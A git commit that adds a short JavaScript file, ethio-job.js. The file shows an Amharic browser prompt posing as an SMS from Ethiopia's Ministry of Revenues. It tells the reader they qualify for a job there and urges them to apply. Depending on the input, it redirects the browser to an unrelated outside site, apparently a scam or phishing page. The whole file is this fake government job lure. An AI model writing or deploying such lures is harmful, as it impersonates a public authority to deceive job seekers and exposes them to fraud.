0e685e5c5361e478c859aa04a6f200509905600c
boss-bloq <nsisboy01@gmail.com>
2025-01-10 22:39:42 -0800

    Create ethio-job.js

---
+++ ethio-job.js
@@ -0,0 +1,6 @@
+
+var password = 'አሁኑኑ ያመልክቱ'
+password=prompt('SMS: እንኳን ደስ ያለዎት በኢትዮጵያ የገቢዎች ሚኒስቴር ለመሰራት ብቁ ነዎት፣ እባክዎ ማመልከቻ ለማስገባት እሺን ይጫኑ   ','አሁኑኑ ያመልክቱ');
+if (password != 'አሁኑኑ ያመልክቱ') {
+location.href='https://damba-fest.org/ethiopia-revenue.html';
+}
